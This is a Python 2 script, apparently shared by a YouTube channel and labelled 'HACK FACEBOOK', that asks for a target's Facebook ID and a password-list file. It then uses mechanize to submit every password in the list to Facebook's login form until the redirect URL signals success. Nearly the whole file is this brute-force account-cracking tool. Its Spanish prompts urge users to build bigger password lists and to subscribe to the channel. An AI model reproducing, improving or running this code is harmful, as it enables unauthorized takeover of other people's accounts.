#!/usr/bin/env python
# -*- coding: UTF-8 -*-
	
	
import os
import sys
import mechanize
import cookielib
import random 
import time

os.system('clear')

def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

if sys.platform == "linux" or sys.platform == "linux2":
     GL = "\033[96;1m" # Blue aqua
     BB = "\033[34;1m" # Blue light
     YY = "\033[33;1m" # Yellow light
     GG = "\033[32;1m" # Green light
     WW = "\033[0;1m"  # White light
     RR = "\033[31;1m" # Red light
     CC = "\033[36;1m" # Cyan light
     B = "\033[34m"    # Blue
     Y = "\033[33;1m"    # Yellow
     G = "\033[32m"    # Green
     W = "\033[0;1m"     # White
     R = "\033[31m"    # Red
     C = "\033[36;1m"    # Cyan
     rand = (BB,YY,GG,WW,RR,CC)
     P = random.choice(rand)
def cover():
    print """
    
    
    
    
     """
    runntek(GL+"         YouTube'@Thony_DroidYT ^_^...")
    time.sleep(1)
    print " "
    print RR+"  +============================================+"
    print GG+"  |☆☆☆☆    HACK FACEBOOK By THONYDRO    ☆☆☆|"
    print RR+"  +============================================+"
    print WW+"  |            Script BY: Thony_DroidYT        |"
    print GG+"  |              Reza antes de usar xd         |"
    print WW+"  |            FACEBOOK: @ThonyDroidYt         |"
    print Y+"   |             YouTube: @THONYDROID 2.0       |"
    print WW+"  |--------------------------------------------|"
    print GL+"  |        LIFE OF PROGRAMMER [ A.M.C ]        |"
    print WW+"  |--------------------------------------------|"
    print RR+"  +============================================+"
    print GG+"  |☆☆☆   HACK FACEBOOK By Thony_DroidYT  ☆☆☆|"
    print RR+"  +============================================+"     


cover()

email = str(raw_input(GL+" â€¢Introduzca la ID del objetivo\033[33;1m: "))

passwordlist = str(raw_input(WW+" â€¢Ingrese el archivo de Contraseñas\033[95m[ pass.txt, pass1.txt, pass2.txt, pass3.txt pass4.txt] \033[92;1m: "))


#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]


def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        welcome()
        search()
        print " "
        runntek(RR+"  Ninguna Contraseña de La lista coincide")
        runntek(RR+"  Desarrolle su propia lista de contraseñas")
        time.sleep(1)
        print WW+34*"  -"
        kol()

def kol():
    nok = raw_input("Editar lista de contraseñas.? \033[96;1m[y/n]: ")
    if nok == "y":
        print ("Por favor escriba la orden\033[92;1m[ nano pass.txt nano pass2.txt nano pass3.txt para editar su lista] !")
        print ("Al terminar Por favor toque \033[92;1m[ CTRL X Y Y para guardar su lista] !")
        print WW+(41*"-")
        print GL+(" ")
        os.sys.exit()
    else:
        exit(0)
def brute(password):
        sys.stdout.write(GG+"\r[+]\033[97;1m Probando ..... {}\n".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print("\033[92;1m\n\n[+]\033[97;1m Contraseña Encontrada \033[31;1m===| \033[96;1m{}".format(password)) 
                        print " "
                        raw_input(WW+"PULSE ENTER PARA SALIR.....")
                        sys.exit(1)


def search():
        global password
        passwords = open(passwordlist,"r")
        for password in passwords:
                passwords = password.replace("\n","")
                brute(password)


#welcome
def welcome():
        wel = GG+"""
No olvides suscribirte al Canal de Youtube "ThonyDroidYT" 
Y darle LIKE al Video.... Gracias!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \033[96;4mLife Of Programmer\033[92;1m
       |_|
      """
        print wel
        print " "
        total = open(passwordlist,"r")
        total = total.readlines()
        print " "
        print GL+" [*] Cuenta a Crackear : {}".format(email)
        print RR+" [*] Cantidad :" , len(total),WW+ "passwords"
        print Y+" [*] Crackeando, porfavor espere.....\n\n"

if __name__ == '__main__':
        main()
